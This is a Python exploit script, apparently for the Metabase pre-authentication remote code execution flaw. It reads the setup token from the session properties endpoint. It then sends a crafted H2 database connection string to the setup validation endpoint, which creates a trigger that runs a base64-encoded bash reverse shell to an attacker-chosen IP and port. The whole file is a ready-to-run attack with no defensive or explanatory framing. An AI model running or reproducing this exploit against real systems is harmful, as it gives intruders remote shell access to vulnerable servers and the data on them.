import requests
import json
import base64
logo = '''
   _____   _____   ___ __ ___ ____   ____ ___   __ _ _   __
  / __\ \ / / __|_|_  )  \_  )__ /__|__ /( _ ) / /| | | / /
 | (__ \ V /| _|___/ / () / / |_ \___|_ \/ _ \/ _ \_  _/ _ \\
  \___| \_/ |___| /___\__/___|___/  |___/\___/\___/ |_|\___/

'''

print(logo + "By: threatHNTR\n")

# Get user input target host
target_host = input("Enter target host (e.g., http://localhost): ")

# Define the headers for both requests
headers = {
    "Content-Type": "application/json"
}

# Step 1: Obtain the setup token and Metabase version
path = "/api/session/properties"
url = f"{target_host}{path}"
try:
    response = requests.get(url, verify=False)
    if response.status_code == 200:
        data = response.json()
        setup_token = data.get("setup-token")
        metabase_version = data.get("version", {}).get("tag")

        if setup_token is None:
            print("Setup token not found or is null.")
            exit()
        else:
            print(f"Setup Token: {setup_token}")
            print(f"Version: {metabase_version}")
    else:
        print(f"Failed to obtain the token with status code {response.status_code}")
        exit()
except requests.exceptions.RequestException as e:
    print(f"Exception occurred: {e}")
    print(f"Failed to connect to {target_host}.")
    exit()

# Step 2: Get user input for IP address and port
print("Enter the IP address and port for the reverse shell.")
ip_address_reverse = input("Enter IP address: ")
port_reverse = input("Enter port: ")

# Step 3: Encode the payload in base64
payload = f"sh -i >& /dev/tcp/{ip_address_reverse}/{port_reverse} 0>&1"
payload_base64 = base64.b64encode(payload.encode()).decode()

# Step 4: Define the JSON data for the second request with the encoded payload
shell_url = f"{target_host}/api/setup/validate"
shell_data = {
    "token": setup_token,
    "details": {
        "is_on_demand": False,
        "is_full_sync": False,
        "is_sample": False,
        "cache_ttl": None,
        "refingerprint": False,
        "auto_run_queries": True,
        "schedules": {},
        "details": {
            "db": f"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{payload_base64}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x",
            "advanced-options": False,
            "ssl": True
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}

# Step 5: Send the second POST request to obtain the reverse shell
try:
    print(f"Sending reverse shell request to {target_host}:{port_reverse}...")
    shell_response = requests.post(shell_url, headers=headers, data=json.dumps(shell_data))

except requests.exceptions.RequestException as e:
    print(f"Exception occurred: {e}")
    print(f"Failed to connect to {target_host}:{port_reverse}.")
    exit()
